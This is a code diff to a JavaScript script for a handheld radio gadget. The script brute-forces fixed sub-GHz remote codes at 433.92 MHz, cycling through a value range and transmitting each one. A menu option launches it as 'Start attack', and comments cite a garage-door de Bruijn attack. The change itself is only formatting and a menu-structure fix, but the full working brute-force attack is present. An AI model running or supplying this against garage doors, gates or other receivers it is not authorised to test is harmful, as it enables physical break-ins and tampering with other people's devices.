@@ -1,5 +1,5 @@
 
-// bruteforce RF signals 
+// bruteforce RF signals
 // derived from https://github.com/mcore1976/cc1101-tool/blob/main/cc1101-tool-esp32.ino#617
 // for a more efficient attack look at https://github.com/UberGuidoZ/Flipper/tree/main/Sub-GHz/Garages/deBruijn
 // use at your own risk, some devices may lock you out as a security mechanism when spammed with this!
@@ -12,39 +12,38 @@ var freq = 433920000;  // fixed frequency
 
 function brute_force() {
     var max_val = value_prefix + (1 << no_bits);
-    
+
     for ( var brute_val = value_prefix; brute_val < max_val ; brute_val++) {
-        fillScreen(0);  
+        fillScreen(0);
         var curr_val = brute_val.toString(16).toUpperCase();
-        
+
         drawString("sending", 3 , 0);
         drawString(curr_val, 3 , 16);
         drawString("hold any key to stop", 3 , 32);
-        
+
         if(getAnyPress()) break;
-        
+
         // example full cmd: "subghz tx 445533 433920000 174 10"
         //serialCmd("subghz tx " + curr_val + " " + freq + " 174 10");
-        
+
         subghzTransmit(curr_val, freq, 174, 10);
         // TODO: customize te=174  count=10
-        
+
         delay(delay_ms);
     }
 }
 
 
 while(true)
-{ 
-  var choice = dialogChoice([
-    "Init value:" + value_prefix, "value_prefix",
-    "Range bits:" + no_bits, "no_bits",
-    "Delay: " + delay_ms, "delay_ms",
-    "Frequency:" + freq, "freq",
-    "Start attack", "attack",
-    ]
-  )
-  
+{
+  var choice = dialogChoice({
+    ["Init value:" + value_prefix]: "value_prefix",
+    ["Range bits:" + no_bits]: "no_bits",
+    ["Delay: " + delay_ms]: "delay_ms",
+    ["Frequency:" + freq]: "freq",
+    ["Start attack"]: "attack"
+  });
+
   if(choice=="") break;  // quit
   else if(choice=="value_prefix") value_prefix = parseInt(keyboard(String(value_prefix), 32, "starting value"));
   else if(choice=="no_bits") no_bits = parseInt(keyboard(String(no_bits), 32, "bits to iterate"));
@@ -57,6 +56,6 @@ while(true)
       }
       brute_force();
   }
-  
+
   fillScreen(0); // clear screen
 }
